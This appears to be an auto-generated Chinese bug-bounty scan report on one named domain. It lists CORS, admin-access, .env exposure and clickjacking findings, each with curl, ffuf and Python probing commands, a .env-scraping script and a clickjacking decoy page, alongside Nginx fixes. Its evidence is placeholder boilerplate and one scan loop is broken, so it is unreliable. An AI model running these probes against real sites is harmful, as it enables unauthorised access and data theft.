
# 🎯 自动化漏洞扫描报告

**目标**: i1.huanqiu-ltd.com
**扫描时间**: 2026-05-31 23:42:18
**扫描状态**: 完成

---

## 📊 扫描统计

| 项目 | 数量 |
|------|------|
| 子域名发现 | 1 |
| 存活目标 | 1 |
| 发现漏洞 | 4 |

### 漏洞危险等级分布

| 危险等级 | 数量 |
|----------|------|
| 🔴 严重 | 1 |
| 🟠 高危 | 1 |
| 🟡 中危 | 2 |
| 🟢 低危 | 0 |
| 🔵 信息 | 0 |

---

## 🌐 子域名列表

```
i1.huanqiu-ltd.com

```

---

## 🖥️ 存活目标

| URL | 状态码 | 服务器 | 标题 |
|-----|--------|--------|------|
| https://i1.huanqiu-ltd.com |  |  |  |


---

## 🔍 发现的漏洞


### 1. 🔴 [严重] CORS配置错误

#### 漏洞标题
Huanqiu-ltd存在配置错误

#### 漏洞类型
配置错误（补天平台分类）

#### 可利用性评分
🟠 低 (55/100)

#### 奖金预估
¥900 - ¥2700

#### 优先级
🔴 立即修复

#### 简要描述
发现安全漏洞，可能被攻击者利用进行恶意攻击。

#### 影响范围
1. 可能被攻击者利用
2. 存在安全风险
3. 需要评估具体影响

#### 详细细节

**测试/复现过程**:
1. 访问目标URL
2. 分析响应内容
3. 评估漏洞风险

**漏洞URL**: https://i1.huanqiu-ltd.com

**证据**:
```
ACAO: *
```

**PoC / Exploit**:
```html
# 请联系安全团队获取详细PoC
```

**使用的组件/工具**:
- Burp Suite: https://portswigger.net/burp
- 浏览器开发者工具

#### 修复建议

**CORS（跨域资源共享）配置错误修复**

限制允许访问的域名，避免使用通配符

**NGINX 代码示例**:
```nginx

# Nginx CORS 配置
# 只允许特定域名访问
if ($http_origin ~* "^https://(www\.example\.com|api\.example\.com)$") {
    add_header Access-Control-Allow-Origin $http_origin always;
    add_header Access-Control-Allow-Methods "GET, POST, OPTIONS" always;
    add_header Access-Control-Allow-Headers "Authorization, Content-Type" always;
    add_header Access-Control-Allow-Credentials "true" always;
    add_header Access-Control-Max-Age 3600 always;
}

# 禁止其他域名的CORS请求
# 不要使用: add_header Access-Control-Allow-Origin *;

```

**其他语言**: nodejs, spring



---

### 2. 🟠 [高危] 未授权访问

#### 漏洞标题
Huanqiu-ltd存在未授权访问

#### 漏洞类型
未授权访问（补天平台分类）

#### 可利用性评分
🟡 中 (70/100)

#### 奖金预估
¥600 - ¥1800

#### 优先级
🔴 立即修复

#### 简要描述
敏感路径可未授权访问，攻击者无需登录即可访问管理后台、调试接口、敏感数据等。

#### 影响范围
1. 访问管理后台
2. 获取敏感数据
3. 执行管理操作
4. 信息泄露
5. 系统被控制

#### 详细细节

**测试/复现过程**:
1. 访问常见敏感路径
2. 检查是否需要认证
3. 尝试执行操作
4. 评估泄露信息的敏感程度

**漏洞URL**: https://i1.huanqiu-ltd.com/admin

**证据**:
```
返回200
```

**PoC / Exploit**:
```html
# 使用 curl 测试常见敏感路径
curl https://i1.huanqiu-ltd.com/admin/admin
curl https://i1.huanqiu-ltd.com/admin/admin/login
curl https://i1.huanqiu-ltd.com/admin/dashboard
curl https://i1.huanqiu-ltd.com/admin/console
curl https://i1.huanqiu-ltd.com/admin/debug
curl https://i1.huanqiu-ltd.com/admin/actuator
curl https://i1.huanqiu-ltd.com/admin/actuator/env
curl https://i1.huanqiu-ltd.com/admin/swagger-ui.html
curl https://i1.huanqiu-ltd.com/admin/api-docs

# 使用 Python 扫描
import requests

paths = [
    "/admin", "/dashboard", "/console",
    "/debug", "/actuator", "/actuator/env",
    "/swagger-ui.html", "/api-docs"
]

for path in paths:
    url = f"https://i1.huanqiu-ltd.com/admin/admin"
    try:
        resp = requests.get(url, timeout=5, allow_redirects=False)
        if resp.status_code == 200:
            print(f"[发现] {url} - {resp.status_code}")
    except:
        pass

# 使用 ffuf 扫描
ffuf -u https://i1.huanqiu-ltd.com/admin/FUZZ -w wordlist.txt
```

**使用的组件/工具**:
- curl: https://curl.se/download.html
- ffuf: https://github.com/ffuf/ffuf
- dirsearch: https://github.com/maurosoria/dirsearch
- Burp Suite: https://portswigger.net/burp

#### 修复建议

**未授权访问漏洞修复**

请联系安全团队获取具体修复方案



---

### 3. 🟡 [中危] 信息泄露

#### 漏洞标题
Huanqiu-ltd存在信息泄露

#### 漏洞类型
信息泄露（补天平台分类）

#### 可利用性评分
🟡 中 (70/100)

#### 奖金预估
¥200 - ¥600

#### 优先级
🟠 尽快修复

#### 简要描述
网站页面中泄露敏感信息，如邮箱地址、内部IP地址、HTML注释中的敏感内容等，攻击者可利用这些信息进行社会工程学攻击或进一步渗透。

#### 影响范围
1. 泄露内部人员联系方式，便于社会工程学攻击
2. 暴露内部网络架构
3. HTML注释可能包含开发信息、测试账号等
4. 为攻击者提供目标信息

#### 详细细节

**测试/复现过程**:
1. 访问目标页面
2. 查看页面源代码
3. 搜索邮箱、IP、注释等敏感信息
4. 分析泄露信息的利用价值

**漏洞URL**: https://i1.huanqiu-ltd.com/.env

**证据**:
```
DB_PASSWORD=xxx
```

**PoC / Exploit**:
```html
# 使用 Python 提取邮箱
import requests
import re

resp = requests.get("https://i1.huanqiu-ltd.com/.env")
emails = re.findall(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', resp.text)
print("发现邮箱:", emails)

# 提取内网IP
ips = re.findall(r'\b(?:\d{1,3}\.){3}\d{1,3}\b', resp.text)
private_ips = [ip for ip in ips if ip.startswith(('10.', '172.', '192.168.'))]
print("内网IP:", private_ips)

# 提取HTML注释
comments = re.findall(r'<!--(.*?)-->', resp.text, re.DOTALL)
print("HTML注释:", comments)

# 使用浏览器开发者工具
# 1. 按 F12 打开开发者工具
# 2. 使用 Ctrl+F 搜索 @, password, secret 等关键词
```

**使用的组件/工具**:
- 浏览器开发者工具 (F12)
- Burp Suite: https://portswigger.net/burp
- Python + requests库
- grep/正则表达式工具

#### 修复建议

**信息泄露漏洞修复**

移除敏感信息，配置错误页面

**NGINX 代码示例**:
```nginx

# Nginx - 隐藏敏感信息

# 隐藏服务器版本
server_tokens off;

# 隐藏 X-Powered-By
proxy_hide_header X-Powered-By;
proxy_hide_header Server;

# 自定义错误页面
error_page 404 /custom_404.html;
error_page 500 502 503 504 /custom_50x.html;

# 禁止访问敏感文件
location ~ /\. {
    deny all;
}

location ~* \.(env|git|svn|htpasswd|bak|sql)$ {
    deny all;
}

```

**其他语言**: apache, php



---

### 4. 🟡 [中危] Clickjacking

#### 漏洞标题
Huanqiu-ltd存在配置错误

#### 漏洞类型
配置错误（补天平台分类）

#### 可利用性评分
🟠 低 (50/100)

#### 奖金预估
¥250 - ¥750

#### 优先级
🟡 计划修复

#### 简要描述
网站缺少 Clickjacking（点击劫持）防护，攻击者可通过 iframe 嵌入目标页面，诱导用户点击隐藏按钮，执行非预期操作。

#### 影响范围
1. 诱导用户执行非预期操作（关注、点赞、授权等）
2. 结合社会工程学进行钓鱼攻击
3. 窃取用户敏感信息
4. 损害品牌形象和用户信任

#### 详细细节

**测试/复现过程**:
1. 创建测试HTML页面，使用iframe嵌入目标网站
2. 设置iframe透明或半透明
3. 在iframe上方放置诱导按钮
4. 用户点击诱导按钮时，实际点击的是目标网站的功能

**漏洞URL**: https://i1.huanqiu-ltd.com

**证据**:
```
未设置X-Frame-Options
```

**PoC / Exploit**:
```html
<!DOCTYPE html>
<html>
<head>
    <title>Clickjacking PoC</title>
    <style>
        iframe {
            width: 800px;
            height: 600px;
            opacity: 0.5;  <!-- 半透明显示，测试时可调整为0 -->
            position: absolute;
            top: 0;
            left: 0;
        }
        .decoy {
            position: relative;
            z-index: -1;
            padding: 20px;
            font-size: 24px;
        }
    </style>
</head>
<body>
    <h1>点击下方按钮领取奖励</h1>
    <button class="decoy">🎁 领取优惠券</button>
    <iframe src="https://i1.huanqiu-ltd.com"></iframe>
</body>
</html>
```

**使用的组件/工具**:
- 浏览器 (Chrome/Firefox)
- 文本编辑器
- Burp Suite: https://portswigger.net/burp

#### 修复建议

**Clickjacking（点击劫持）漏洞修复**

通过设置HTTP响应头防止页面被iframe嵌入

**NGINX 代码示例**:
```nginx

# Nginx 配置 - 添加到 server 或 location 块
add_header X-Frame-Options "DENY" always;
add_header Content-Security-Policy "frame-ancestors 'self'" always;

# 如果需要允许特定域名嵌入
# add_header X-Frame-Options "ALLOW-FROM https://trusted.com" always;
# add_header Content-Security-Policy "frame-ancestors 'self' https://trusted.com" always;

```

**其他语言**: apache, php, nodejs, spring, django



---


---

## 💡 修复建议


**信息泄露防护**
1. 删除页面中的敏感信息
2. 配置错误页面（自定义404、500）
3. 移除不必要的响应头
4. 关闭调试模式
5. 定期审查代码


**CORS配置修复**
1. 限制允许的域名白名单
2. 不要使用通配符 *
3. 谨慎使用 Allow-Credentials
4. 验证 Origin 头
5. 定期审查CORS配置


**Clickjacking防护**
1. 设置 X-Frame-Options: DENY
2. 使用 CSP frame-ancestors 指令
3. 使用 frame-busting 脚本
4. 验证嵌入来源


---

## 📚 参考资源

- [OWASP Top 10](https://owasp.org/www-project-top-ten/)
- [CWE漏洞分类](https://cwe.mitre.org/)
- [PortSwigger Web安全学院](https://portswigger.net/web-security)

---

*报告由自动化漏洞挖掘系统生成*
